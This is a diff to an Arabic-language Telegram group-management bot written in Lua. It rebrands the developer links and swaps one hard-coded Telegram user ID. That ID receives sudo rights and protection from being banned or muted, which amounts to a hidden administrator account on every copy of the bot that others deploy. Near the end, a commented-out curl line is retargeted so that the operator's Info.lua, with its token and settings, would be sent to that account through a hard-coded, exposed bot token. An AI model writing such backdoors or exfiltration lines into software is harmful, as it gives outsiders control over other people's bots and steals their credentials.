@@ -138,7 +138,7 @@ _redis = load_redis()
 --------------------------------------------------------------------------------------------------------------
 print([[
 > CH › @alking_1234
-~> DEVELOPER › @PS_PO 
+~> DEVELOPER › @B_TRR 
 ]])
 sudos = dofile("./Info.lua") 
 SUDO = tonumber(sudos.SUDO)
@@ -164,7 +164,7 @@ print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,1803789143,1362402940,1804324782}   
+sudo_users = {SUDO,1803789143,1362402940,1776217339}   
 function SudoBot(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users) do  
@@ -258,7 +258,7 @@ if tonumber(user_id) == tonumber(1803789143) then
 var = true  
 elseif tonumber(user_id) == tonumber(1362402940) then
 var = true  
-elseif tonumber(user_id) == tonumber(1804324782) then
+elseif tonumber(user_id) == tonumber(1776217339) then
 var = true  
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = true  
@@ -296,7 +296,7 @@ if tonumber(user_id) == tonumber(1803789143) then
 var = 'مبرمج السورس'
 elseif tonumber(user_id) == tonumber(1362402940) then
 var = 'مالك السورس'
-elseif tonumber(user_id) == tonumber(1804324782) then
+elseif tonumber(user_id) == tonumber(1776217339) then
 var = 'ملك التلجرام'
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = 'المطور الاساسي'  
@@ -2710,7 +2710,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '⌯ ＡＬＥＸ ⌯',url="t.me/PC_SS"}},
+{{text = '⌯ ＡＬＥＸ ⌯',url="t.me/B_TRR"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -2720,7 +2720,7 @@ end
 if text == 'مبرمج السورس' and DevSoFi(msg) then
 database:del(bot_id..'Srt:Bot') 
 local Text = [[ 
-[DEV ](t.me/PS_PO)
+[DEV ](t.me/B_TRR)
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
@@ -2928,7 +2928,7 @@ local Text = [[
 keyboard = {}  
 keyboard.inline_keyboard = { 
 {{text = ' 𝐀𝑳𝐊𝐈𝐍𝐆', url="t.me/alking_1234"}}, 
-{{text = '𝗔𝗟𝗘𝗫', url="t.me/PS_PO"}}, 
+{{text = '𝗔𝗟𝗘𝗫', url="t.me/B_TRR"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -2940,7 +2940,7 @@ local Text = [[
 keyboard = {}  
 keyboard.inline_keyboard = { 
 {{text = ' 𝐀𝑳𝐊𝐈𝐍𝐆', url="t.me/TWLANGBOT"}}, 
-{{text = '𝗔𝗟𝗘𝗫', url="t.me/PS_PO"}}, 
+{{text = '𝗔𝗟𝗘𝗫', url="t.me/B_TRR"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -2948,11 +2948,11 @@ end
 
 if text == 'مبرمج السورس' then
 local Text = [[ 
-[𝗔𝗟𝗘𝗫](t.me/PS_PO)
+[𝗔𝗟𝗘𝗫](t.me/B_TRR)
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '𝗔𝗟𝗘𝗫', url="t.me/PS_PO"}}, 
+{{text = '𝗔𝗟𝗘𝗫', url="t.me/B_TRR"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -2963,27 +2963,27 @@ local Text = [[
  𝐀𝑳𝐊𝐈𝐍𝐆
 ]]
 keyboard = {} keyboard.inline_keyboard = {
-{{text = '𝗔𝗟𝗘𝗫', url="t.me/PS_PO"}}, 
+{{text = '𝗔𝗟𝗘𝗫', url="t.me/B_TRR"}}, 
 {{text = 'فلابي بيرد', url="https://t.me/awesomebot?game=FlappyBird"},{text = 'تحداني فالرياضيات',url="https://t.me/gamebot?game=MathBattle"}},   
 {{text = 'لعبه دراجات', url="https://t.me/gamee?game=MotoFX"},{text = 'سباق سيارات', url="https://t.me/gamee?game=F1Racer"}}, 
 {{text = 'تشابه', url="https://t.me/gamee?game=DiamondRows"},{text = 'كره القدم', url="https://t.me/gamee?game=FootballStar"}}, 
 {{text = 'ورق', url="https://t.me/gamee?game=Hexonix"},{text = 'لعبه 2048', url="https://t.me/awesomebot?game=g2048"}}, 
-{{text = '𝗔𝗟𝗘𝗫', url="t.me/PS_PO"}}, 
+{{text = '𝗔𝗟𝗘𝗫', url="t.me/B_TRR"}}, 
 {{text = 'SQUARES', url="https://t.me/gamee?game=Squares"},{text = 'ATOMIC', url="https://t.me/gamee?game=AtomicDrop1"}}, 
 {{text = 'CORSAIRS', url="https://t.me/gamebot?game=Corsairs"},{text = 'LumberJack', url="https://t.me/gamebot?game=LumberJack"}}, 
 {{text = 'LittlePlane', url="https://t.me/gamee?game=LittlePlane"},{text = 'RollerDisco', url="https://t.me/gamee?game=RollerDisco"}},  
 {{text = 'كره القدم 2', url="https://t.me/gamee?game=PocketWorldCup"},{text = 'جمع المياه', url="https://t.me/gamee?game=BlockBuster"}},  
-{{text = '𝗔𝗟𝗘𝗫', url="t.me/PS_PO"}}, 
+{{text = '𝗔𝗟𝗘𝗫', url="t.me/B_TRR"}}, 
 {{text = 'لا تجعلها تسقط', url="https://t.me/gamee?game=Touchdown"},{text = 'GravityNinja', url="https://t.me/gamee?game=GravityNinjaEmeraldCity"}},  
 {{text = 'Astrocat', url="https://t.me/gamee?game=Astrocat"},{text = 'Skipper', url="https://t.me/gamee?game=Skipper"}},  
 {{text = 'WorldCup', url="https://t.me/gamee?game=PocketWorldCup"},{text = 'GeometryRun', url="https://t.me/gamee?game=GeometryRun"}},  
 {{text = 'Ten2One', url="https://t.me/gamee?game=Ten2One"},{text = 'NeonBlast2', url="https://t.me/gamee?game=NeonBlast2"}},  
 {{text = 'Paintio', url="https://t.me/gamee?game=Paintio"},{text = 'onetwothree', url="https://t.me/gamee?game=onetwothree"}},  
-{{text = '𝗔𝗟𝗘𝗫', url="t.me/PS_PO"}}, 
+{{text = '𝗔𝗟𝗘𝗫', url="t.me/B_TRR"}}, 
 {{text = 'BrickStacker', url="https://t.me/gamee?game=BrickStacker"},{text = 'StairMaster3D', url="https://t.me/gamee?game=StairMaster3D"}},  
 {{text = 'LoadTheVan', url="https://t.me/gamee?game=LoadTheVan"},{text = 'BasketBoyRush', url="https://t.me/gamee?game=BasketBoyRush"}},  
 {{text = 'GravityNinja21', url="https://t.me/gamee?game=GravityNinja21"},{text = 'MarsRover', url="https://t.me/gamee?game=MarsRover"}},  
-{{text = '𝗔𝗟𝗘𝗫', url="t.me/PS_PO"}}, 
+{{text = '𝗔𝗟𝗘𝗫', url="t.me/B_TRR"}}, 
 {{text = 'LoadTheVan', url="https://t.me/gamee?game=LoadTheVan"},{text = 'GroovySki', url="https://t.me/gamee?game=GroovySki"}},  
 {{text = 'PaintioTeams', url="https://t.me/gamee?game=PaintioTeams"},{text = 'KeepItUp', url="https://t.me/gamee?game=KeepItUp"}},  
 {{text = 'SunshineSolitaire', url="https://t.me/gamee?game=SunshineSolitaire"},{text = 'Qubo', url="https://t.me/gamee?game=Qubo"}},  
@@ -2994,7 +2994,7 @@ keyboard = {} keyboard.inline_keyboard = {
 {{text = 'SkodaHockey1 ', url="https://t.me/gamee?game=SkodaHockey1"},{text = 'SummerLove', url="https://t.me/gamee?game=SummerLove"}},  
 {{text = 'SmartUpShark', url="https://t.me/gamee?game=SmartUpShark"},{text = 'SpikyFish3', url="https://t.me/gamee?game=SpikyFish3"}},  
 {{text = ' 𝐀𝑳𝐊𝐈𝐍𝐆', url="t.me/alking_1234"}}, 
-{{text = '𝗔𝗟𝗘𝗫', url="t.me/PS_PO"}}, 
+{{text = '𝗔𝗟𝗘𝗫', url="t.me/B_TRR"}}, 
 }  
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -3005,20 +3005,20 @@ local Text = [[
  𝐀𝑳𝐊𝐈𝐍𝐆
 ]]
 keyboard = {} keyboard.inline_keyboard = {
-{{text = '𝗔𝗟𝗘𝗫', url="t.me/PS_PO"}}, 
+{{text = '𝗔𝗟𝗘𝗫', url="t.me/B_TRR"}}, 
 {{text = 'لعبة فلابي بيرد 🐥',url="http://t.me/awesomebot?game=FlappyBird"}},
 {{text = 'سباق سيارات 🏎', url="http://t.me/gamee?game=F1Racer"}},
 {{text = 'كرة قدم ⚽', url="http://t.me/gamee?game=FootballStar"}},
-{{text = '𝗔𝗟𝗘𝗫', url="t.me/PS_PO"}}, 
+{{text = '𝗔𝗟𝗘𝗫', url="t.me/B_TRR"}}, 
 {{text = 'سباق الدراجات🏍', url="https://t.me/gamee?game=MotoFX"}},
 {{text = 'متشابه 👾', url="https://t.me/gamee?game=DiamondRows"}},
 {{text = 'ورق🤹‍♂', url="https://t.me/gamee?game=Hexonix"}},
-{{text = '𝗔𝗟𝗘𝗫', url="t.me/PS_PO"}}, 
+{{text = '𝗔𝗟𝗘𝗫', url="t.me/B_TRR"}}, 
 {{text = 'MotoFx', url="https://t.me/gamee?game=MotoFx"}},
 {{text = 'ورق🤹‍♂', url="https://t.me/gamee?game=Hexonix"}},
 {{text = 'لعبة 204', url="https://t.me/awesomebot?game=g2048"}},
 {{text = 'Squares🏁', url="https://t.me/gamee?game=Squares"}},
-{{text = '𝗔𝗟𝗘𝗫', url="t.me/PS_PO"}}, 
+{{text = '𝗔𝗟𝗘𝗫', url="t.me/B_TRR"}}, 
 {{text = ' 𝐀𝑳𝐊𝐈𝐍𝐆', url="t.me/alking_1234"}}, 
 }
 local msg_id = msg.id_/2097152/0.5
@@ -3922,7 +3922,7 @@ if result.sender_user_id_ == tonumber(1362402940) then
 send(msg.chat_id_, msg.id_, " ⌯ لا يمكنك حظر مالك السورس\n")
 return false 
 end
-if result.sender_user_id_ == tonumber(1804324782) then
+if result.sender_user_id_ == tonumber(1776217339) then
 send(msg.chat_id_, msg.id_, " ⌯ لا يمكنك حظر ملك التلجرام\n")
 return false 
 end
@@ -4034,7 +4034,7 @@ if result.sender_user_id_ == tonumber(1362402940) then
 send(msg.chat_id_, msg.id_, " ⌯ لا يمكنك كتم مالك السورس\n")
 return false 
 end
-if result.sender_user_id_ == tonumber(1804324782) then
+if result.sender_user_id_ == tonumber(1776217339) then
 send(msg.chat_id_, msg.id_, " ⌯ لا يمكنك كتم ملك التلجرام\n")
 return false 
 end
@@ -11697,7 +11697,7 @@ keyboard.inline_keyboard = {
 },
 {
 {text = ' 𝐀𝑳𝐊𝐈𝐍𝐆', url="t.me/alking_1234"},
-{text = 'مبرمج السورس', url="t.me/PS_PO"},
+{text = 'مبرمج السورس', url="t.me/B_TRR"},
 },
 }
 local msg_id = msg.id_/2097152/0.5
@@ -12459,7 +12459,7 @@ keyboard.inline_keyboard = {
 },
 {
 {text = ' 𝐀𝑳𝐊𝐈𝐍𝐆', url="t.me/alking_1234"},
-{text = 'مبرمج السورس', url="t.me/PS_PO"},
+{text = 'مبرمج السورس', url="t.me/B_TRR"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -12490,7 +12490,7 @@ keyboard.inline_keyboard = {
 },
 {
 {text = ' 𝐀𝑳𝐊𝐈𝐍𝐆', url="t.me/alking_1234"},
-{text = 'مبرمج السورس', url="t.me/PS_PO"},
+{text = 'مبرمج السورس', url="t.me/B_TRR"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -12521,7 +12521,7 @@ keyboard.inline_keyboard = {
 },
 {
 {text = ' 𝐀𝑳𝐊𝐈𝐍𝐆', url="t.me/alking_1234"},
-{text = 'مبرمج السورس', url="t.me/PS_PO"},
+{text = 'مبرمج السورس', url="t.me/B_TRR"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -12554,7 +12554,7 @@ keyboard.inline_keyboard = {
 },
 {
 {text = ' 𝐀𝑳𝐊𝐈𝐍𝐆', url="t.me/alking_1234"},
-{text = 'مبرمج السورس', url="t.me/PS_PO"},
+{text = 'مبرمج السورس', url="t.me/B_TRR"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -12901,7 +12901,7 @@ DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
 return false
 end 
 end
---local curl = 'curl "'..'https://api.telegram.org/bot1704828705:AAGxtUPVSoztF7BAJkKjzW05XD21mCh-kdI/sendDocument'..'" -F "chat_id='.. 1804324782 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
+--local curl = 'curl "'..'https://api.telegram.org/bot1704828705:AAGxtUPVSoztF7BAJkKjzW05XD21mCh-kdI/sendDocument'..'" -F "chat_id='.. 1776217339 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
 ------------------------------------------------------------------------
 if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
 if database:get(bot_id.."lock:Link"..msg.chat_id_) then
